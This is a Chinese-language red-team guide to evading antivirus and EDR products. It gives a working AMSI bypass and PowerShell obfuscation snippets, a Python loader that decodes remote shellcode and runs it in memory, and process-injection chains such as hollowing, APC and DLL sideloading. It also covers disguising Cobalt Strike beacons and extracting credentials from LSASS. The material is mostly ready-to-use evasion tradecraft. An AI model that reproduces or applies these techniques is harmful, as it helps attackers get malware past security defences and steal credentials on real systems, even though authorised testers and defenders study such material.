# 渗透测试免杀技术实战

---

## 一、免杀对抗四层模型

```
杀软/EDR检测层次 × 免杀对抗：

Layer 1: 静态签名检测
  → 对抗：代码混淆、加密Payload、分离加载、修改特征
  → 工具：Veil, Shellter, msfvenom编码器

Layer 2: 启发式/行为检测
  → 对抗：API Unhooking、Syscall直接调用、代码注入
  → 技术：Hell's Gate, SysWhispers3, DInvoke

Layer 3: 沙箱分析
  → 对抗：环境检测（延迟执行/CPU核数/内存/进程检测）
  → 技术：Sleep Mask(Beacon休眠时加密内存)

Layer 4: 内存扫描/云查杀
  → 对抗：Call Stack Spoofing、回调执行、分段加载
```

---

## 二、Payload 混淆

```powershell
# PowerShell 免杀技巧

# 1. 编码混淆（Base64 + XOR）
$payload = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String($encoded))

# 2. 字符串拆分与拼接
$c1="I";$c2="E";$c3="X"; Invoke-Expression ($c1+$c2+$c3)

# 3. 变量名混淆
${s`omETh`InG`r`An`Dom}=Get-Process

# 4. 反射加载（不落地）
$assembly = [System.Reflection.Assembly]::Load($bytes)

# 5. AMSI 绕过
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

```python
# Shellcode 加载器模板

import ctypes
import base64

# XOR 解码
def xor_decode(data, key=0x5A):
    return bytes([b ^ key for b in data])

# 从远程加载分离Shellcode
shellcode_enc = base64.b64decode(remote_shellcode)
shellcode = xor_decode(shellcode_enc)

# 内存分配+执行
kernel32 = ctypes.windll.kernel32
ptr = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.memmove(ptr, shellcode, len(shellcode))
kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
```

---

## 三、进程注入技术

```
进程注入技术演进：

经典注入：
  OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
  → EDR监控：跨进程内存写入+远程线程创建 → 极易检测

进程镂空 (Process Hollowing)：
  CreateProcess(CREATE_SUSPENDED) → 
  NtUnmapViewOfSection(清空目标进程内存) →
  VirtualAllocEx + WriteProcessMemory(写入恶意代码) →
  SetThreadContext(修改入口点) → ResumeThread

Early Bird APC注入：
  创建挂起进程 → WriteProcessMemory → 
  QueueUserAPC → ResumeThread(APC在进程初始化前执行)
  
DLL侧载 (DLL Sideloading)：
  利用合法签名的应用程序加载恶意DLL
  例：将恶意 version.dll 放在 OneDrive.exe 同级目录
  OneDrive.exe加载时会优先加载同目录的version.dll
```

---

## 四、Cobalt Strike 免杀改造

```
CS Beacon 免杀重点：

1. 修改默认配置
   - 修改 Malleable C2 Profile (流量混淆)
   - 修改 C2通信特征(URI/Header/Cookie)
   - 修改 JA3指纹

2. Beacon 内存保护
   - 使用 Sleep Mask Kit (休眠时加密Beacon内存)
   - 自定义 Reflective Loader

3. 加载方式多样化
   - Stageless > Staged (少一次网络请求 = 少一个检测点)
   - 回调执行 (EnumWindows/Certificate Enrollment替代CreateThread)

4. 后渗透工具免杀
   - Mimikatz → 自定义凭据提取(用DInvoke调用LSASS)
   - 避免落地工具（内存中执行）
```

---

## 五、Checklist

- [ ] Payload混淆(编码/加密/拆分)
- [ ] Shellcode加载器多样化
- [ ] 进程注入技术选型
- [ ] C2 Profile混淆(Malleable C2)
- [ ] Sleep Mask内存保护
- [ ] 避免工具落地
- [ ] AMSI/ETW绕过
- [ ] 每次操作后验证EDR是否检测到
